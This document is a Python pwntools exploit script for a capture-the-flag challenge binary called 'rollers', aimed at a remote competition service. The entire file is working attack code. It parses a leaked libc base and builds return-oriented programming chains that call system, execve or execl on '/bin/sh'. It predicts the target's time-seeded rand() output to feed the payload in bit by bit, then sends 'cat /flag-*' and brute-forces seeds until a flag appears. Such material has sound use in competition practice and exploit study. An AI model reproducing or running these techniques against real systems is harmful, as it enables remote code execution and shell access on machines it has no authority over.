#!/usr/bin/env python3
import ctypes
import os
import re
import sys
import time

from pwn import context, process, remote


HOST = os.environ.get("HOST", "quals.sprush.rocks")
PORT = int(os.environ.get("PORT", "2339"))
LOCAL = os.environ.get("LOCAL") == "1"
MODE = os.environ.get("MODE", "system")
POST_EXPLOIT_CMD = os.environ.get("CMD", "cat /flag-*; exit")
DUMP_ANY = os.environ.get("DUMP_ANY") == "1"
READ_TIMEOUT = float(os.environ.get("READ_TIMEOUT", "5"))
BASE_TIME = os.environ.get("BASE_TIME")
PART_IDX = int(os.environ.get("PART_IDX", "0"))
PARTS = int(os.environ.get("PARTS", "1"))
SKIP_RET = os.environ.get("SKIP_RET") == "1"

LIBC_PATH = os.environ.get("LIBC_PATH", "/tmp/libc_from_image.so.6")
LOADER_PATH = "/tmp/libc_resolute/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
BIN_PATH = "./rollers"

# Ubuntu image digest fed6ddb82c61194e... ships libc 2.42-2ubuntu2
PRINTF_OFF = int(os.environ.get("PRINTF_OFF", "0x64100"), 16)
RET_OFF = int(os.environ.get("RET_OFF", "0x28842"), 16)
POP_RDI_OFF = int(os.environ.get("POP_RDI_OFF", "0x11B87A"), 16)
SYSTEM_OFF = int(os.environ.get("SYSTEM_OFF", "0x5C480"), 16)
EXIT_OFF = int(os.environ.get("EXIT_OFF", "0x48920"), 16)
PUTS_OFF = int(os.environ.get("PUTS_OFF", "0x8E600"), 16)
EXECVE_OFF = int(os.environ.get("EXECVE_OFF", "0xF86C0"), 16)
EXECL_OFF = int(os.environ.get("EXECL_OFF", "0xF8060"), 16)
BINSH_OFF = int(os.environ.get("BINSH_OFF", "0x1DB4C3"), 16)
POP_RSI_OFF = int(os.environ.get("POP_RSI_OFF", "0x5C207"), 16)
POP_RDX_OFF = int(os.environ.get("POP_RDX_OFF", "0x48C92"), 16)


context.binary = BIN_PATH
context.log_level = os.environ.get("LOG", "error")

RAND_LIBC = ctypes.CDLL(LIBC_PATH)
RAND_LIBC.srand.argtypes = [ctypes.c_uint]
RAND_LIBC.rand.restype = ctypes.c_int


def p64(value: int) -> bytes:
    return value.to_bytes(8, "little")


def signed_byte(value: int) -> int:
    value &= 0xFF
    return value - 0x100 if value & 0x80 else value


def bit_stream(data: bytes):
    for byte in data:
        for bit in range(8):
            yield (byte >> bit) & 1


def action_stream(seed: int, payload: bytes):
    RAND_LIBC.srand(seed & 0xFFFFFFFF)
    chance = 7
    actions = []
    for want in bit_stream(payload):
        while True:
            roll = RAND_LIBC.rand() % 100
            if roll < signed_byte(chance):
                chance = (chance - 12) & 0xFF
                got = 1
            else:
                chance = (chance + 3) & 0xFF
                got = 0

            actions.append(b"1\n" if got == want else b"2\n")
            if got == want:
                break
    return b"".join(actions)


def build_payload(libc_base: int) -> bytes:
    prefix = [] if SKIP_RET else [p64(libc_base + RET_OFF)]

    if MODE == "puts":
        return b"".join(
            prefix
            + [
                p64(libc_base + POP_RDI_OFF),
                p64(libc_base + BINSH_OFF),
                p64(libc_base + PUTS_OFF),
            ]
        )

    if MODE == "execve":
        return b"".join(
            prefix
            + [
                p64(libc_base + POP_RDI_OFF),
                p64(libc_base + BINSH_OFF),
                p64(libc_base + POP_RSI_OFF),
                p64(0),
                p64(libc_base + POP_RDX_OFF),
                p64(0),
                p64(libc_base + EXECVE_OFF),
            ]
        )

    if MODE == "execl":
        return b"".join(
            prefix
            + [
                p64(libc_base + POP_RDI_OFF),
                p64(libc_base + BINSH_OFF),
                p64(libc_base + POP_RSI_OFF),
                p64(libc_base + BINSH_OFF),
                p64(libc_base + POP_RDX_OFF),
                p64(0),
                p64(libc_base + EXECL_OFF),
            ]
        )

    return b"".join(
        prefix
        + [
            p64(libc_base + POP_RDI_OFF),
            p64(libc_base + BINSH_OFF),
            p64(libc_base + SYSTEM_OFF),
            p64(libc_base + EXIT_OFF),
        ]
    )


def connect():
    if LOCAL:
        return process(
            [LOADER_PATH, "--library-path", "/tmp/libc_resolute/usr/lib/x86_64-linux-gnu", BIN_PATH],
            stdin=-1,
            stdout=-1,
            stderr=-1,
        )
    return remote(HOST, PORT)


def parse_leak(blob: bytes) -> int:
    match = re.search(rb"Libc base: (0x[0-9a-fA-F]+)", blob)
    if not match:
        raise ValueError("failed to parse libc leak")
    libc_base = int(match.group(1), 16)
    if libc_base & 0xFFF:
        raise ValueError(f"unaligned libc base {libc_base:#x}")
    return libc_base


def run_attempt(seed: int):
    io = connect()
    try:
        banner = io.recvuntil(b"> ", timeout=3)
        libc_base = parse_leak(banner)
        payload = build_payload(libc_base)
        scripted = action_stream(seed, payload)
        scripted += b"3\n"
        if MODE != "puts":
            scripted += POST_EXPLOIT_CMD.encode() + b"\n"
        io.send(scripted)
        data = io.recvrepeat(READ_TIMEOUT)
        return data
    finally:
        io.close()


def seed_offsets():
    window = int(os.environ.get("WINDOW", "30"))
    slot = 0
    for delta in range(window + 1):
        if slot % PARTS == PART_IDX:
            yield delta
        slot += 1
        if delta:
            if slot % PARTS == PART_IDX:
                yield -delta
            slot += 1


def main():
    if not os.path.exists(LIBC_PATH):
        print(f"missing libc at {LIBC_PATH}", file=sys.stderr)
        sys.exit(1)

    tried = set()
    for delta in seed_offsets():
        seed_base = int(BASE_TIME) if BASE_TIME is not None else int(time.time())
        seed = seed_base + delta
        if seed in tried:
            continue
        tried.add(seed)
        try:
            data = run_attempt(seed)
        except EOFError:
            continue
        except Exception as exc:
            print(f"seed {seed}: {exc}", file=sys.stderr)
            continue

        if DUMP_ANY and data:
            preview = data[-200:].decode("latin-1", "replace")
            print(f"[seed {seed}] {len(data)} bytes: {preview!r}", file=sys.stderr)

        if LOCAL and data:
            sys.stdout.buffer.write(data)
            return

        if MODE == "puts" and b"/bin/sh" in data:
            print(f"seed {seed}", file=sys.stderr)
            sys.stdout.buffer.write(data)
            return

        if (
            b"flag{" in data
            or b"sprush{" in data
            or b"ctf{" in data
            or (b"{" in data and b"}" in data)
        ):
            print(f"seed {seed}", file=sys.stderr)
            sys.stdout.buffer.write(data)
            return

    print("no flag found", file=sys.stderr)
    sys.exit(1)


if __name__ == "__main__":
    main()
